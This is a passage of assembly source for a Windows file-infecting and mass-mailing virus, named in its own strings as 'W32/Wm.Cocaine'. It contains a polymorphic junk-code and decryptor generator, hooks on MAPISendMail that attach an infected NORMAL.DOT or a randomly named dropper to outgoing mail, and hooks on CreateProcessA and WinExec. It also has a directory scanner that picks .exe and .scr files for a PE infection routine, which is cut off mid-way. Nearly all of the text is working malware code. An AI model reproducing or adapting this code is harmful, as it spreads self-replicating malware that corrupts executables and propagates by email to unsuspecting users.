       jc @@5
       call random
       js @@7
       mov eax, 0c00bh                         ;or reg, reg
       jmp @@8
  @@7:
       mov eax, 0c085h                         ;test reg, reg
  @@8:
       mov ecx, edx
       shl edx, 3
       or ah, dl
       or ah, cl
       stosw
       jmp @@6
  @@5:
       mov eax, 0f883h
       or ah, dl
       stosw                                   ;cmp reg, 0
       sub eax, eax
       stosb
  @@6:
       mov ax, 850fh                           ;do conditional jump
       stosw
       pop edx
       sub edx, edi                            ;delta distance
       sub edx, 4
       mov eax, edx
       stosd                                   ;jnz start_of_loop
       mov dwo [ebp+(ofs reg32-ofs vcode)], 0
       call garble
       mov al, 0e9h
       stosb                                   ;jmp start
       mov eax, edi
       sub eax, [ebp+(ofs buffer-ofs vcode)]
       sub eax, [ebp+(ofs entry-ofs vcode)]
       add eax, 4
       neg eax
       stosd
       call garble
       call garble
       mov ecx, [ebp+(ofs buffer-ofs vcode)]   ;(this allow the calls be
       sub edi, ecx                            ;forward/backward direction)
       xchg edi, ecx
       mov eax, [ebp+(ofs decriptor-ofs vcode)];calculate new entrypoint
       sub eax, [ebp+(ofs buffer-ofs vcode)]   ;relative to previous rva
       pop esi
       ret
poly   endp

gar    proc
       call random0                            ;get any reg
       and eax, 0111b
       cmp al, 4                               ;esp never
       je gar
       ret
gar    endp

get8free proc
       mov eax, [ebp+(ofs reg32-ofs vcode)]
       and eax, 01111b
       cmp eax, 01111b
       jne @@1
       stc
       ret
  @@1:
       call random0
       and eax, 011b
       bt [ebp+(ofs reg32-ofs vcode)], eax     ;al,cl,dl,bl
       jc get8free
       call random_f
       jc @@2
       or al, 0100b                            ;ah,ch,dh,bh
  @@2:
       ret
get8free endp

get32reg proc                                  ;get a free 32bit reg
       call gar                                ;and mark it as used
       bts [ebp+(ofs reg32-ofs vcode)], eax
       jc get32reg
       ret
get32reg endp

get32free proc                                 ;get a free 32bit reg
       call gar                                ;and NOT mark it as used
       bt [ebp+(ofs reg32-ofs vcode)], eax
       jc get32free
       ret
get32free endp

swapper proc
       call random0
       jc @@1
       xchg edx, ebx                           ;change order
  @@1:
       push edx
       call ebx                                ;call 1th
       call garble
       pop edx
       call edx                                ;call 2th
       call garble
       ret
swapper endp

make_counter proc
       call get32reg
       mov [ebp+(ofs c_reg-ofs vcode)], eax
       cmp al, 5                               ;ebp complicate methodz
       jne @@2
       btr [ebp+(ofs reg32-ofs vcode)], eax    ;free ebp
       jmp make_counter
  @@2:
       or al, 0b8h
       stosb
       mov eax, [ebp+(ofs _size-ofs vcode)]
       test dwo [ebp+(ofs flagz-ofs vcode)], mask _bwd_fwd
       jnz @@1
       neg eax                                 ;counter will be INCed
  @@1:
       stosd
       ret
make_counter endp

make_pointer proc
       call get32reg
       cmp al, 5                               ;ebp complicate methodz
       jne @@1
       btr [ebp+(ofs reg32-ofs vcode)], eax    ;free ebp
       jmp make_pointer
  @@1:
       mov [ebp+(ofs p_reg-ofs vcode)], eax
       or al, 0b8h
       stosb
       mov eax, [ebp+(ofs rva-ofs vcode)]
       test dwo [ebp+(ofs flagz-ofs vcode)], mask _direction
       jz @@2
       add eax, dwo [ebp+(ofs _size-ofs vcode)];pointer will be DECced
       dec eax
  @@2:
       stosd
       ret
make_pointer endp

upd_pointer:
       mov eax, [ebp+(ofs p_reg-ofs vcode)]
       test dwo [ebp+(ofs flagz-ofs vcode)], mask _direction
       jmp _update_reg

upd_counter:
       mov eax, [ebp+(ofs c_reg-ofs vcode)]
       test dwo [ebp+(ofs flagz-ofs vcode)], mask _bwd_fwd

_update_reg proc                               ;z=inc/nz=dec
       mov ebx, 0140h                          ;inc
       mov edx, 0c083h                         ;add
       jz @@0
       xor edx, 0c083h xor 0e883h              ;sub
       mov bl, 48h                             ;dec
  @@0:
       push eax
       mov eax, 3
       call random
       or eax, eax
       jz @@2                                  ;choose method
       dec eax
       jz @@1
       xor edx, 0c083h xor 0e883h              ;sub<->add
       neg bh                                  ;neg(1)
  @@1:
       pop ecx
       mov eax, edx
       or ah, cl                               ;patch reg
       stosw
       movzx eax, bh                           ;signal
       jmp @@3
  @@2:
       pop ecx
       xchg eax, ebx
       or al, cl                               ;patch reg
  @@3:
       stosb
       ret
_update_reg endp

garble proc
       pushad
       inc by [ebp+(ofs recurse-ofs vcode)]
       cmp by [ebp+(ofs recurse-ofs vcode)], MAX_RECURSION
       jae @@1
       mov eax, 8
       call random
       add eax, 4
       mov ecx, eax                            ;4-11 instructionz
  @@0:
       push ecx
       lea esi, [ebp+(ofs gtable-ofs vcode)]
       mov eax, (ofs egtable - ofs gtable)/4
       call random
       shl eax, 2
       add esi, eax
       lodsd
       add eax, ebp
       cmp by [ebp+(ofs lgarble-ofs vcode)], al
       je @@2                                  ;same?
       mov by [ebp+(ofs lgarble-ofs vcode)], al
       call eax
  @@2:
       pop ecx
       loop @@0
  @@1:
       dec by [ebp+(ofs recurse-ofs vcode)]
       mov [esp], edi                          ;copy of edi in stack
       popad
       ret
garble endp

make_subs proc
       cmp by [ebp+(ofs s_into-ofs vcode)], 0
       jne @@1
       cmp dwo [ebp+(ofs subs_index-ofs vcode)], MAX_SUBROUTINES
       ja @@1
       inc by [ebp+(ofs s_into-ofs vcode)]      ;mark into
       mov eax, [ebp+(ofs subs_index-ofs vcode)]
       inc dwo [ebp+(ofs subs_index-ofs vcode)]
       mov ecx, 6
       cdq
       mul ecx
       lea esi, [ebp+eax+(ofs subs_table-ofs vcode)]
       mov al, 0e9h
       stosb
       stosd
       push edi                                ;[esp]-4 = skip_jmp
       call garble
       mov [esi], edi                          ;where sub is
       mov eax, 5
       call random                             ;number of paramz pushed
       mov [esi.4], al                         ;by caller
       mov eax, 5
       call random                             ;number of local variables
       mov [esi.5], al
       test eax, eax                           ;if not local variables, then
       jz @@0                                  ;dont alloc stack
       mov ebx, eax
       shl ebx, 2                              ;displacement in dwords
       mov al, 0c8h
       stosb                                   ;enter
       mov eax, ebx
       stosd                                   ;size/deep
       dec edi
       jmp @@2
  @@0:
       mov al, 55h
       stosb                                   ;push ebp
       mov ax, 0ec8bh
       stosw                                   ;mov ebp, esp
  @@2:
       push dwo [ebp+(ofs reg32-ofs vcode)]    ;save reg state
       mov by [ebp+(ofs _pusha-ofs vcode)], 0  ;no use pusha at start
       mov eax, 3
       call random
       test eax, eax
       je @@4                                  ;will use PUSHA!
  @@10:
       call random0                            ;choose regs
       and eax, 11111111b
       or eax,  00110000b                      ;set EBP and ESP too
       cmp al, -1
       jz @@10
       mov [ebp+(ofs reg32-ofs vcode)], eax
       and eax, 11001111b
       not al                                  ;free regs are set bits now!
       test eax, eax
       jz @@10
  @@5:
       bsf edx, eax
       jz @@6                                  ;no more regs free?
       btc eax, edx                            ;clear it
       cmp dl, 4
       je @@5
       cmp dl, 5                               ;ebp-esp dont need be saved
       je @@5
       push eax
       mov eax, edx                            ;get position
       or al, 50h
       stosb                                   ;store as PUSH
       pop eax
       jmp @@5
  @@4:
       mov by [ebp+(ofs _pusha-ofs vcode)], -1 ;pusha used!
       mov dwo [ebp+(ofs reg32-ofs vcode)], 00110000b
       mov al, 60h                             ;set EBP and ESP as used
       stosb                                   ;pusha
  @@6:
       movzx eax, by [esi.4]
       mov [ebp+(ofs lparm-ofs vcode)], eax
       movzx eax, by [esi.5]
       mov [ebp+(ofs lvars-ofs vcode)], eax    ;set paramz to mem write/read
       call garble
       call garble
       call garble
       xor eax, eax
       mov [ebp+(ofs lparm-ofs vcode)], eax    ;disable mem write/read
       mov [ebp+(ofs lvars-ofs vcode)], eax
       mov al, [ebp+(ofs _pusha-ofs vcode)]
       inc al
       jnz @@7                                 ;well, do individual POPs
       mov al, 61h
       stosb                                   ;POPA
       jmp @@8
  @@7:
       mov eax, [ebp+(ofs reg32-ofs vcode)]
       and eax, 11001111b
       not al                                  ;free regs are set bits now!
  @@9:
       bsr edx, eax
       jz @@8                                  ;no more regs free?
       btc eax, edx                            ;clear it
       cmp dl, 4
       je @@9
       cmp dl, 5                               ;ebp-esp dont need be restored
       je @@9
       push eax
       mov eax, edx                            ;get position
       or al, 58h
       stosb                                   ;store as POP this time
       pop eax
       jmp @@9
  @@8:
       pop dwo [ebp+(ofs reg32-ofs vcode)]     ;restore reg state
  @@3:
       mov al, 0c9h
       stosb                                   ;leave
       mov al, 0c2h
       stosb                                   ;ret
       movzx eax, by [esi.4]
       shl eax, 2
       test eax, eax
       jz @@a
       stosw                                   ;clean params
       jmp @@b
  @@a:
       mov by [edi-1], 0c3h                    ;no paramz, use RETN
  @@b:
       call garble
       pop esi
       mov ecx, edi
       sub ecx, esi                            ;distance
       mov [esi-4], ecx                        ;patch jmp
       dec by [ebp+(ofs s_into-ofs vcode)]
  @@1:
       ret
make_subs endp

make_call proc
       cmp by [ebp+(ofs s_into-ofs vcode)], 0
       jne @@1                                 ;cant call while creating sub
       mov eax, [ebp+(ofs subs_index-ofs vcode)]
       test eax, eax
       jz @@1
       call random                             ;choose one of the subs ready
       mov ecx, 6
       cdq
       mul ecx
       lea esi, [ebp+eax+(ofs subs_table-ofs vcode)]
       movzx ecx, by [esi.4]
       jecxz @@2                               ;how much paramz it need?
  @@3:
       call gar
       or al, 50h                              ;push paramz
       stosb
       loop @@3
  @@2:
       mov al, 0e8h
       stosb                                   ;build call
       mov eax, dwo [esi]
       sub eax, edi
       sub eax,4
       stosd                                   ;store displacement
  @@1:
       ret
make_call endp

lea_dword proc
       mov al, 8dh
       stosb
       call get32free
       shl eax, 3
       push eax
       call gar
       pop edx
       or eax, edx
       or al, 80h
       stosb
       call random0
       stosd
       ret
lea_dword endp

math_byte proc
       mov eax, 8
       call random
       shl eax, 3
       or eax, 1000000011000000b               ;make math operation
       push eax
       call get8free
       pop edx
       jc @@1
       or eax, edx
       xchg al, ah
       stosw
       call random0
       stosb                                   ;byte
  @@1:
       ret
math_byte endp

math_word proc
       mov ax, 8166h
       stosw
       call _math_imm
       stosw
       ret
math_word endp

math_dword proc
       mov al, 81h
       stosb
       call _math_imm
       stosd
       ret
math_dword endp

_math_imm proc
       mov eax, 8
       call random
       shl eax, 3
       or al, 11000000b
       push eax
       call get32free
       pop edx
       or eax, edx                             ;patch reg into
       stosb
       call random0
       ret
_math_imm endp

push_pop proc
       call gar
       or al, 50h
       stosb
       call garble                             ;recurse into
       call get32free
       or al, 58h
       stosb
       ret
push_pop endp

jmpcn  proc
       mov eax, 0fh
       call random
       or ax, 0f80h                            ;jcc near
       xchg al, ah
       stosw
       stosd
       push edi
       call garble                             ;recurse
       pop esi
       mov eax, edi
       sub eax, esi
       mov dwo [esi-4], eax                    ;fix jcc
       ret
jmpcn  endp

jmpcs  proc
       mov eax, 0fh
       call random
       or al, 70h                              ;make jmp conditional
       stosw
       push edi
       call garble                             ;recurse
       pop esi
       push edi
       mov eax, esi
       xchg eax, edi
       sub eax, edi
       mov by [esi-1], al                      ;fix jcc
       or al, al
       jns @@1                                 ;jmp destiny too far?
       mov edi, esi
       dec edi
       dec edi
       call one_byte                           ;replace with 2 byte instr
       call one_byte
 @@1:
       pop edi
       ret
jmpcs  endp

jmpn   proc
       mov al, 0e9h
       stosb
       mov eax, JMP_MAX
       call random
       inc eax
       mov ecx, eax
       stosd
       jmp _shit
jmpn   endp

jmps   proc
       mov eax, JMP_MAX
       call random
       inc eax
       mov ecx, eax
       mov ah, 0ebh
       xchg al, ah
       stosw
       movzx eax, ah
 _shit:
       call random0                           ;ecx bytes of shit
       stosb
       loop _shit
       ret
jmps   endp

movr_byte proc
       call gar
       push eax
       call get8free
       jnc @@1
       pop eax
       ret
  @@1:
       push eax
       mov al, 08ah
       jmp _reg_reg
movr_byte endp

movr_word proc
       mov al, 66h                             ;word-size prefix
       stosb
movr_word endp

movr_dword proc
       call gar
       push eax
       call get32free
       push eax
       mov al, 08bh
  _reg_reg:
       stosb
       pop eax                                 ;destino
       pop edx                                 ;source
       shl eax, 3
       or eax, edx
       or eax, 11000000b
       stosb
       ret
movr_dword endp

mov_dword proc
       call get32free
       or al, 0b8h
       stosb
       call random0
       stosd
       ret
mov_dword endp

mov_word proc
       mov al, 66h
       stosb
       call get32free
       or al, 0b8h
       stosb
       call random0
       stosw
       ret
mov_word endp

mov_byte proc
       call get8free
       jc @@1
       or al, 0b0h
       stosb
       call random0
       stosb
  @@1:
       ret
mov_byte endp

one_byte proc
       mov eax, 5
       call random
       lea ebx, [ebp+(ofs one_byte_table-ofs vcode)]
       xlat
       stosb
       ret
one_byte endp

inc_dec proc
       call get32free
       add al, 40h
       call random_f
       js @@1
       or al, 01000b                           ;inc/dec
  @@1:
       stosb
       ret
inc_dec endp

mov_zs_x proc
       call random0
       mov eax, 0b60fh
       js @@1
       mov ah, 0beh                            ;z/s
  @@1:
       adc ah, 0                               ;16/8
       stosw
       call gar
       push eax
       call get32free
       shl eax, 3
       pop edx
       or eax, edx
       or al, 0c0h
       stosb
       ret
mov_zs_x endp

one_byte_table equ this byte
       std
       clc
       cmc
       cld
       std

crypt_table equ this byte
       db 080h, 030h, 034h                     ;xor
       db 0f6h, 010h, 0f6h                     ;not
       db 080h, 000h, 02ch                     ;add
       db 080h, 028h, 004h                     ;sub

gtable equ this byte
       dd ofs jmpcn-ofs vcode
       dd ofs jmpcs-ofs vcode
       dd ofs jmpn-ofs vcode
       dd ofs jmps-ofs vcode
       dd ofs one_byte-ofs vcode
       dd ofs push_pop-ofs vcode
       dd ofs push_pop-ofs vcode
       dd ofs push_pop-ofs vcode
       dd ofs push_pop-ofs vcode
       dd ofs inc_dec-ofs vcode
       dd ofs inc_dec-ofs vcode
       dd ofs mov_zs_x-ofs vcode
       dd ofs mov_zs_x-ofs vcode
       dd ofs math_word-ofs vcode
       dd ofs math_word-ofs vcode
       dd ofs movr_word-ofs vcode
       dd ofs movr_word-ofs vcode
       dd ofs mov_word-ofs vcode
       dd ofs mov_word-ofs vcode
       dd ofs movr_byte-ofs vcode
       dd ofs movr_byte-ofs vcode
       dd ofs movr_byte-ofs vcode
       dd ofs math_byte-ofs vcode
       dd ofs math_byte-ofs vcode
       dd ofs math_byte-ofs vcode
       dd ofs mov_byte-ofs vcode
       dd ofs mov_byte-ofs vcode
       dd ofs mov_byte-ofs vcode
       dd ofs math_dword-ofs vcode
       dd ofs math_dword-ofs vcode
       dd ofs math_dword-ofs vcode
       dd ofs math_dword-ofs vcode
       dd ofs math_dword-ofs vcode
       dd ofs math_dword-ofs vcode
       dd ofs mov_dword-ofs vcode
       dd ofs mov_dword-ofs vcode
       dd ofs mov_dword-ofs vcode
       dd ofs mov_dword-ofs vcode
       dd ofs mov_dword-ofs vcode
       dd ofs mov_dword-ofs vcode
       dd ofs movr_dword-ofs vcode
       dd ofs movr_dword-ofs vcode
       dd ofs movr_dword-ofs vcode
       dd ofs movr_dword-ofs vcode
       dd ofs movr_dword-ofs vcode
       dd ofs movr_dword-ofs vcode
       dd ofs lea_dword-ofs vcode
       dd ofs lea_dword-ofs vcode
       dd ofs lea_dword-ofs vcode
       dd ofs lea_dword-ofs vcode
       dd ofs lea_dword-ofs vcode
       dd ofs lea_dword-ofs vcode
       dd ofs mov_dword-ofs vcode
       dd ofs mov_dword-ofs vcode
       dd ofs mov_dword-ofs vcode
       dd ofs mov_dword-ofs vcode
       dd ofs mov_dword-ofs vcode
       dd ofs mov_dword-ofs vcode
       dd ofs movr_dword-ofs vcode
       dd ofs movr_dword-ofs vcode
       dd ofs movr_dword-ofs vcode
       dd ofs movr_dword-ofs vcode
       dd ofs movr_dword-ofs vcode
       dd ofs movr_dword-ofs vcode
       dd ofs lea_dword-ofs vcode
       dd ofs lea_dword-ofs vcode
       dd ofs lea_dword-ofs vcode
       dd ofs lea_dword-ofs vcode
       dd ofs lea_dword-ofs vcode
       dd ofs lea_dword-ofs vcode

egtable equ this byte                          ;end of in-memory encripted part

title1 db 'W32/Wm.Cocaine', 0

text0  db 'Your life burn faster, obey your master...', 0
text1  db 'Chop your breakfast on a mirror...', 0
text2  db 'Veins that pump with fear, sucking darkest clear...', 0
text3  db 'Taste me you will see, more is all you need...', 0
text4  db 'I will occupy, I will help you die...', 0
text5  db 'I will run through you, now I rule you too...', 0
text6  db "Master of Puppets, I'm pulling your strings...", 0

text_table equ this byte
       dd ofs text0-ofs vcode
       dd ofs text1-ofs vcode
       dd ofs text2-ofs vcode
       dd ofs text3-ofs vcode
       dd ofs text4-ofs vcode
       dd ofs text5-ofs vcode
       dd ofs text6-ofs vcode

Payload:
       nop                                     ;on/off switch
       sub ecx, ecx
       push ecx
       lea eax, [ebp+(ofs title1-ofs vcode)]
       push eax
       mov eax, 7
       call random
       mov eax, [ebp+(ofs text_table-ofs vcode)+eax*4]
       add eax, ebp
       push eax                                ;silly MessageBox payload
       push ecx
       call [ebp+(ofs _MessageBoxA-ofs vcode)]
       ret

kernel           db 'KERNEL32', 0
user             db 'USER32', 0
mapi             db 'MAPI32', 0

align 4

sGetProcAddress  db 'GetProcAddress', 0        ;APIs from kernel32.dll that
sGetModuleHandle db 'GetModuleHandleA', 0      ;we need
sCreateProcessA  db 'CreateProcessA', 0
sCreateFileA     db 'CreateFileA', 0
sWinExec         db 'WinExec', 0
sCloseHandle     db 'CloseHandle', 0           ;api names, related to other 2
sLoadLibraryA    db 'LoadLibraryA', 0
sFreeLibrary    db 'FreeLibrary', 0
sCreateFileMappingA db 'CreateFileMappingA', 0
sMapViewOfFile   db 'MapViewOfFile', 0
sUnmapViewOfFile db 'UnmapViewOfFile', 0
sFindFirstFileA  db 'FindFirstFileA', 0
sFindNextFileA   db 'FindNextFileA', 0
sFindClose       db 'FindClose', 0
sSetEndOfFile    db 'SetEndOfFile', 0
sVirtualAlloc    db 'VirtualAlloc', 0
sVirtualFree     db 'VirtualFree', 0
sGetSystemTime   db 'GetSystemTime', 0
sGetWindowsDirectoryA db 'GetWindowsDirectoryA', 0
sGetSystemDirectoryA db 'GetSystemDirectoryA', 0
sGetCurrentDirectoryA db 'GetCurrentDirectoryA', 0
sSetFileAttributesA db 'SetFileAttributesA', 0
sSetFileTime     db 'SetFileTime', 0
sExitProcess     db 'ExitProcess', 0
sGetCurrentProcess db 'GetCurrentProcess', 0
sWriteProcessMemory db 'WriteProcessMemory',0
sWriteFile       db 'WriteFile', 0
sDeleteFileA     db 'DeleteFileA', 0
sSleep           db 'Sleep', 0
sCreateThread    db 'CreateThread', 0
sGetFileSize     db 'GetFileSize', 0
sSetFilePointer  db 'SetFilePointer', 0

sMessageBoxA     db 'MessageBoxA', 0           ;USER32 functionz
sFindWindowA     db 'FindWindowA', 0
sPostMessageA    db 'PostMessageA', 0

sMAPISendMail    db 'MAPISendMail', 0

ConsultKey proc
       call @@1
  @@1v dd 0
  @@1:
       push 000F003Fh                          ;KEY_ALL_ACCESS
       push 0
       push eax

       push 80000001H
  what_key equ dwo $-4
       call [ebp+(ofs _RegOpenKeyEx-ofs vcode)]
       test eax, eax
       jnz @@0
       call @@3
       dd 0
  @@3:
       mov edx, [esp]
       mov dwo [edx], MAX_PATH
       lea eax, [ebp+(ofs directory-ofs vcode)]
       mov esi, eax
       mov [eax], eax
       push eax
       push 0
       push 0
       call @@4
       db 0
  @@4:
       push dwo [ebp+(ofs @@1v-ofs vcode)]
       call [ebp+(ofs _RegQueryValueEx-ofs vcode)]
       push dwo [ebp+(ofs @@1v-ofs vcode)]
       call [ebp+(ofs _RegCloseKey-ofs vcode)] ;close key
  @@0:
       ret
ConsultKey endp

align 4

k32_names        equ this byte
                 dd (ofs sCreateProcessA-ofs vcode)
                 dd (ofs sCreateFileA-ofs vcode);these are relative pointerz
                 dd (ofs sWinExec-ofs vcode)   ;to namez... zero end list
                 dd (ofs sCloseHandle-ofs vcode)
                 dd (ofs sLoadLibraryA-ofs vcode)
                 dd (ofs sFreeLibrary-ofs vcode)
                 dd (ofs sCreateFileMappingA-ofs vcode)
                 dd (ofs sMapViewOfFile-ofs vcode)
                 dd (ofs sUnmapViewOfFile-ofs vcode)
                 dd (ofs sFindFirstFileA-ofs vcode)
                 dd (ofs sFindNextFileA-ofs vcode)
                 dd (ofs sFindClose-ofs vcode)
                 dd (ofs sSetEndOfFile-ofs vcode)
                 dd (ofs sVirtualAlloc-ofs vcode)
                 dd (ofs sVirtualFree-ofs vcode)
                 dd (ofs sGetSystemTime-ofs vcode)
                 dd (ofs sGetWindowsDirectoryA-ofs vcode)
                 dd (ofs sGetSystemDirectoryA-ofs vcode)
                 dd (ofs sGetCurrentDirectoryA-ofs vcode)
                 dd (ofs sSetFileAttributesA-ofs vcode)
                 dd (ofs sSetFileTime-ofs vcode)
                 dd (ofs sExitProcess-ofs vcode)
                 dd (ofs sGetCurrentProcess-ofs vcode)
                 dd (ofs sWriteProcessMemory-ofs vcode)
                 dd (ofs sWriteFile-ofs vcode)
                 dd (ofs sDeleteFileA-ofs vcode)
                 dd (ofs sSleep-ofs vcode)
                 dd (ofs sCreateThread-ofs vcode)
                 dd (ofs sGetFileSize-ofs vcode)
                 dd (ofs sSetFilePointer-ofs vcode)
                 dd 0
                 dd (ofs sMessageBoxA-ofs vcode)
                 dd (ofs sFindWindowA-ofs vcode)
                 dd (ofs sPostMessageA-ofs vcode)
                 dd 0

DeleteShitFile proc
       call delta
       mov ebx, [esp+4]
       push 80h
       push ebx
       call [ebp+(ofs _SetFileAttributesA-ofs vcode)]
       test eax, eax
       jz @@1
       push ebx
       call [ebp+(ofs _DeleteFileA-ofs vcode)]
  @@1:
       ret 4
DeleteShitFile endp

NewMAPISendMail proc
       push esp                                ;original MAPISendMail
       pushad
       call delta
       lea eax, [ebp+(ofs mapi-ofs vcode)]
       push eax
       call [ebp+(ofs _GetModuleHandle-ofs vcode)]
       lea ecx, [ebp+(ofs sMAPISendMail-ofs vcode)]
       push ecx
       push eax
       call [ebp+(ofs _GetProcAddress-ofs vcode)]
       mov [esp+(8*4)], eax                  ;return address=MAPISendMail

       mov edi, [esp+(12*4)]                 ;MAPI Struct
       cmp dwo [edi.nFileCount], 0             ;file attached?
       jnz @@3
       inc dwo [edi.nFileCount]                ;set 1 attachments

       lea ebx, [ebp+(ofs MF-ofs vcode)]
       mov [edi.lpFiles], ebx
       sub eax, eax
       mov edi, ebx
       mov ecx, 6
       rep stosd                               ;esi=file structure

       call OpenAncev
       jc @@4                                  ;file dont exists, binary send

       call GetTemplateDir

  @@aaa:
       lodsb
       test al, al
       jnz @@aaa

       call @@aab
ndot   db '\NORMAL.DOT', 0
  @@aab:
       pop edi
       xchg edi, esi

       dec edi
  @@aac:
       lodsb
       stosb
       test al, al                             ;we'll send infected NORMAL.DOT
       jnz @@aac

       lea esi, [ebp+(ofs directory-ofs vcode)]
       push 80h
       push esi
       call [ebp+(ofs _SetFileAttributesA-ofs vcode)]

       test eax, eax
       jz @@4                                  ;file exists?

       mov eax, esi
       mov edx, 'COD'
       jmp @@5
  @@4:

       call CreateDropper

       mov eax, [ebp+(ofs mm_on_off-ofs vcode)]
       push eax                                ;buffer
       mov eax, [ebp+(ofs fsizel-ofs vcode)]
       push eax                                ;size
       lea edi, [ebp+(ofs rbuf-ofs vcode)]
       mov ebx, edi
       call @@111
shitfile db 'C:\ENIACOC.SYS', 0
  @@111:
       pop esi
  @@111a:
       lodsb
       stosb
       test al, al
       jnz @@111a
       push ebx                                ;name

       mov dwo [ebp+(ofs wd_att-ofs vcode)], 82h
       call WriteDump                          ;hidden dump

       push 00004000h+00008000h
       push 0
       push dwo [ebp+(ofs mm_on_off-ofs vcode)]
       call [ebp+(ofs _VirtualFree-ofs vcode)]

       lea eax, [ebp+(ofs rbuf-ofs vcode)]
       mov edx, 'EXE'
  @@5:
       lea edi, [ebp+(ofs MF-ofs vcode)]
       mov [edi.lpszPathName], eax             ;set file to send
       lea esi, [ebp+(ofs rbuf+MAX_PATH-ofs vcode)]
       mov [edi.lpszFileName], esi
       xchg edi, esi
       mov eax, 8
       call random
       inc eax
       inc eax
       inc eax
       mov ecx, eax
  @@a:
       mov eax, 23
       call random
       add al, 'A'
       stosb
       loop @@a
       mov al, '.'
       stosb
       mov eax, edx
       stosd
  @@3:
       mov dwo [ebp+(ofs mm_on_off-ofs vcode)], 0
       popad
       ret
NewMAPISendMail endp

NewCreateProcessA proc
       push esp                                ;new handler for CreateProcessA
       pushad
       call CheckName
       call delta
       mov eax, [ebp+(ofs _CreateProcessA-ofs vcode)]
       mov [esp+(7*4)+4], eax
       popad
       ret
NewCreateProcessA endp

RestoreChunkz db FALSE

NewWinExec proc
       push esp                                ;new handler for WinExec
       pushad
       call CheckName
       call delta
       mov eax, [ebp+(ofs _WinExec-ofs vcode)]
       mov [esp+(7*4)+4], eax
       popad
       ret
NewWinExec endp

ProcessDir proc
       pushad
       lea edi, [ebp+(ofs directory-ofs vcode)];edi=dir to process
       add edi, eax                            ;eax=size of dir
       lea esi, [ebp+(ofs FileMask-ofs vcode)]
       movsd
       movsd                                   ;copy *.* mask
       lea eax, [ebp+(ofs find_data-ofs vcode)]
       push eax
       lea eax, [ebp+(ofs directory-ofs vcode)]
       push eax
       call [ebp+(ofs _FindFirstFileA-ofs vcode)]
       inc eax
       jz @@0                                  ;no file found?
       dec eax
       mov [ebp+(ofs search_handle-ofs vcode)], eax
  @@1:
       pushad
       lea esi, [ebp+(ofs directory-ofs vcode)]
       sub eax, eax
       mov edx, esi
  @@3:
       lodsb
       cmp al, '\'                             ;search last slash
       jne @@5
       mov edx, esi                            ;update slash position
  @@5:
       test al, al
       jnz @@3
       lea esi, [ebp+(ofs filename-ofs vcode)]
       mov edi, edx
  @@4:
       lodsb
       cmp al, 'V'
       je @@6
       cmp al, 'v'
       je @@6
       cmp al, '0'
       jb @@4a
       cmp al, '9'
       jbe @@6
  @@4a:
       stosb
       test al, al                             ;copy name to path
       jnz @@4
       mov eax, dwo [edi-4]
       or eax, 202020h
       not eax
       xor eax, not 'exe'
       jz @@7
       xor eax, ((not 'rcs')xor(not 'exe'))
       jnz @@6                                 ;tricky, isnt? :)
  @@7:
       call Infect
  @@6:                                         ;process it
       popad
       lea eax, [ebp+(ofs find_data-ofs vcode)]
       push eax
       mov eax, [ebp+(ofs search_handle-ofs vcode)]
       push eax
       call [ebp+(ofs _FindNextFileA-ofs vcode)]
       test eax, eax                           ;no more files in this dir?
       jne @@1
  @@2:
       push dwo [ebp+(ofs search_handle-ofs vcode)]
       call [ebp+(ofs _FindClose-ofs vcode)]   ;close search
  @@0:
       popad
       ret
ProcessDir endp

peh_machine = 4
peh_nosections = 6
peh_ntheader = 20
peh_flags = 22
peh_initdata = 32
peh_entrypoint = 40
peh_imagebase = 52
peh_imagesize = 80
peh_chksum = 88
peh_reloc1 = 160
peh_reloc2 = 164

seh_rvasz = 8
seh_rva = 12
seh_rawsz = 16
seh_raw = 20
seh_attr = 36

Infect proc                                    ;infect PE filez
       mov eax, [ebp+(ofs seed-ofs vcode)]
       mov [ebp+(ofs pseed-ofs vcode)], eax
       mov ecx, DIV_VALUE
       call set_new_eh
       mov esp,[esp+8]                         ;fix stack
_remove_seh:
       jmp remove_seh
       db 0EAh
set_new_eh:
       sub edx, edx
       push dwo fs:[edx]
       mov fs:[edx], esp                       ;set SEH
       mov by [ebp+(ofs inf?-ofs vcode)], dl
       cmp [ebp+(ofs fsizeh-ofs vcode)], edx
       jne _remove_seh                         ;too big?
       mov eax, [ebp+(ofs fsizel-ofs vcode)]
       cmp dwo [ebp+(ofs mm_on_off-ofs vcode)], 0
       jnz @@5                                 ;skip size check for droppers
       test eax, eax
       jz @@5a
       cmp eax, 16*1024
       jbe _remove_seh                         ;smaller than 16kb?
  @@5:
       div ecx
       test edx, edx                           ;padded to 101 boundary?
       jz _remove_seh
  @@5a:
       call MapFile                            ;map file
       mov ecx, eax
       mov ebx, eax
       jecxz _remove_seh                       ;error mapping

       mov [ebp+(ofs map@-ofs vcode)], eax

       cmp wo [ecx], 'ZM'                      ;EXE file?
       jne @@0
       cmp wo [ecx+18h], 40h
       jne @@0
       mov edi, [ecx+3ch]
       add edi, ecx
       mov [ebp+(ofs pe_header-ofs vcode)], edi
       cmp dwo [edi], 'EP'                     ;PE EXE file?
       jne @@0
       cmp wo [edi+peh_machine], 014Ch         ;i386?
       jne @@0
       movzx eax, wo [edi+peh_flags]
       not al
       test eax, 2002h
       jnz @@0                                 ;isnt DLL? is executable?
       mov esi, edi
       movzx ecx, wo [edi+peh_nosections]
       cmp ecx, 3
       jb @@0                                  ;too few sections
       dec ecx
       mov eax, ecx
       shl eax, 3
       shl ecx, 5
       add eax, ecx
       movzx ecx, wo [edi+peh_ntheader]
       add eax, 24
       add eax, ecx                            ;esi=pe header
       add edi, eax                            ;edi=section header

       bt dwo [edi.seh_attr], 6                ;must be init data
       jnc @@0

       pushad
       mov eax, [esi+peh_entrypoint]
       mov [ebp+(ofs old_eip-ofs vcode)], eax  ;copy entrypoint
       mov edi, esi
       movzx ecx, wo [edi+peh_ntheader]
       add ecx, 24
       add edi, ecx                            ;edi=first section header
       mov eax, [edi+seh_rva]
       mov [ebp+(ofs sRVA-ofs vcode)], eax
       mov eax, [edi+seh_rawsz]
       mov [ebp+(ofs RawSize-ofs vcode)], eax  ;set vars for branch_entry

       mov ecx, [esi+132]
       mov eax, [edi+seh_rva]
       add eax, [edi+seh_rvasz]
       mov ebx, [esi+128]
       sub eax, ebx
       jc @@not_in_1st                         ;IT start after end of 1st sec

       cmp ecx, eax
       ja @@set_it
       xchg eax, ecx
       jmp @@set_it
  @@not_in_1st:
       sub ecx, ecx
  @@set_it:
       mov [ebp+(ofs it_size-ofs vcode)], ecx

       push 00000040h
       push 00002000h+00001000h+00100000h
       push 32*1024
       push 0
       call [ebp+(ofs _VirtualAlloc-ofs vcode)]
       mov [ebp+(ofs buffer2-ofs vcode)], eax
       push 00000040h
